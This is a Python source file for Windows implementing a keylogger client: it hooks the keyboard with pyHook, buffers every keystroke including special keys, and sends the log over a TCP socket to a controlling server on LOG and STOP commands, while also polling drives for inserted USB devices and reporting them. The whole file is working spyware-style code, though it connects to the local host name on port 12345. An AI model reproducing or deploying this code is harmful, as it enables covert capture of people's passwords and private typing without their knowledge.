import socket
import win32file as w
import os
import pyHook as hk
import pythoncom as com
from threading import *

def detect(client):
    while True:
        #Check All drives From A-Z
        for i in range(65,91):
            x = chr(i)
            if w.GetDriveType(x+":\\") == w.DRIVE_REMOVABLE:
                client.send("USB".encode('ASCII'))
                #break


def keypress(event):
    global log
    global client
    print(event.Key)
    if event.Key == "Return":
        key = "\n"
    elif event.Key == "Tab":
        key = "\t"
    elif event.Key == "Space":
        key = " "
    elif len(event.Key) > 1:
        #Special Keys
        key = "<"+event.Key+">"
    else:
        key = event.Key
    #Key length exceeding receiving buffer,so first send current log
    if len(key) > (1024-len(log)):
        #Notifying Server that I'm about to send LOG
        client.send("LOG".encode('ASCII'))
        client.send(log.encode('ASCII'))
        log = key
    elif len(key) == (1024-len(log)):
        log += key
        #Notifying Server that I'm about to send LOG
        client.send("LOG".encode('ASCII'))
        client.send(log.encode('ASCII'))
    else:
        log += key
    #Always Return True
    return True


def keylog(hook):
    #Assign Our keypress function to KeyDown
    hook.KeyDown = keypress
    hook.HookKeyboard()
    #Listen for events
    com.PumpMessages()


def listen(client,hook):
    global log
    while True:
        command = client.recv(1024)
        command = command.decode()
        if command == "LOG":
            Thread(target=keylog,args=[hook]).start()
        elif command == "STOP":
            hook.UnhookKeyboard()
            client.send("LOG".encode('ASCII'))
            client.send(log.encode('ASCII'))



#Create a hook Manager
hook = hk.HookManager()
#log first stores upto 1024 key presses and then sends it to server
log = ""
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((socket.gethostname(),12345))
#Creating Thread to listen to messages from Server
Thread(target=listen,args=[client,hook]).start()
#Start checking for USB insertion
detect(client)
